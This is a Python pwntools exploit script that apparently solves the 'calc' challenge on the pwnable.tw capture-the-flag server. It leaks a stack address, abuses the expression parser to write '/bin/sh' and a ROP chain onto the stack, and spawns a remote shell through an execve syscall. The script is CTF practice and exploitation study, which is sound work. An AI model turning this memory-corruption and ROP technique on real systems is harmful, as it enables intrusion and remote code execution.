#!/usr/bin/env python3
from pwn import *
import warnings
warnings.filterwarnings("ignore")

exe = ELF("./calce")
# context.log_level='debug'
context.terminal = ["foot"]
p = remote("chall.pwnable.tw", 10100)
# p = process([exe.path])
# stack = 0
def gdbs():
    gdb.attach(p, gdbscript="""
    # cmp >9
    # b*0x08049098
    # b*0x08049354
    # b*0x080491C7
    # if null or not ?
    # b*0x8049164
    # b*0x080491B7
    # b*0x08049247
    # b*0x08049303
    # b*0x080493FF
    # return parse_
    b*0x08049376
    # v1[v1[0]]
    # b*0x080493FF



               """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
zerocheck = 0
last_data = 0
last_idx = 0
def create_payload(idx,data):
    if data > 0:
       rp = "+"+str(data)
    else:
       rp = str(data)
    if idx > 0:
       payload = "+"+str(idx)+rp
    else:
       payload = str(idx)+rp
    return payload
def create_payload_minus(idx,data):
    if data > 0:
       rp = "-"+str(data)
    else:
       rp = "+"+str(data)[1:]
    if idx > 0:
       payload = "+"+str(idx)+rp
    else:
       payload = str(idx)+rp
    return payload
def clear(addr,dataofaddress):
    azero = stack + 0x201dc
    idx = (addr - azero)//4
    input()
    if idx>0:
        idx = "+"+str(idx)
    else:
        idx = str(idx)
    payload = ""
    if dataofaddress > 0:
        payload = idx+"+"+str(dataofaddress)
    else:
        payload = idx+"+"+str(dataofaddress&0xffffffff)
    sl(payload)
    log.info(f"payload: {payload}")
def write_stack(stack, addr,data):
    # only write 4 bytes  
    global last_data
    global last_idx

    input()

    azero = stack + 0x201dc
    log.info(f"azero: {hex(azero)}")
    idx = (addr - azero)//4

    if data ==0:
        if last_data == 0:
            return
        sl(create_payload_minus(last_idx, last_data))
        last_data = 0
        last_idx = 0
        print(f"last idx: {last_idx}")
        print(f"last data: {hex(last_data)}")
        return
    last_data = data
    last_idx = idx
    log.info(f"idx : {str(idx)}")
    rp = ""
    payload = create_payload(idx,data)
    log.info(f"payload : {payload}")
    sl(payload) 
pop_eax = 0x0805c34b
int_80 = 0x08049a21
pop_ecx_ebx = 0x080701d1
pop_edx = 0x080701aa
leave_ret = 0x08048d88
mov_ebp_ = 0x080bc7a3
add_esp_ = 0x080e1f77
jmp_ebp_=0x08093161
pop_esp = 0x080bc4f6
mov_esp_ebp_ = 0x080bc815
idx = 360
sl(f"+{idx}")
p.recvline()
addr = int(p.recvline(),10) & 0xffffffff
# addr = int(p.recvuntil("/n",drop=True))
stack = addr - 133016
log.info(f"leak : {hex(stack)}")
input()
write_addr = stack +0x2079c
log.info(f"write addr: {hex(write_addr)}")
bin_sh = 0x80eb074
write_stack(stack,bin_sh,0x68732f2f)
write_stack(stack,bin_sh-4,0x6e69622f)
lists = []
lists.append(pop_eax)
lists.append(0xb)
lists.append(pop_ecx_ebx)
lists.append(0)
lists.append(bin_sh-0x4)
lists.append(pop_edx)
lists.append(0)
lists.append(int_80)
# clear stack to write value

for i in range(len(lists)):
    write_stack(stack,write_addr+(i*4),-0x8049c30)

# write in reverse order because of "a1[*a1 - 1] += a1[*a1];"
for i in range(len(lists)):
    write_stack(stack, write_addr+(len(lists)-1-i)*4, lists[len(lists)-1-i])
# gdbs()
rbps=stack+0x201bc
log.info(f"rbp: {hex(rbps)}")
# parse_expr rip
write_new = stack + 0x2077c
data_of = stack+0x20798
# gdbs()









p.interactive()
# good luck pwning :)

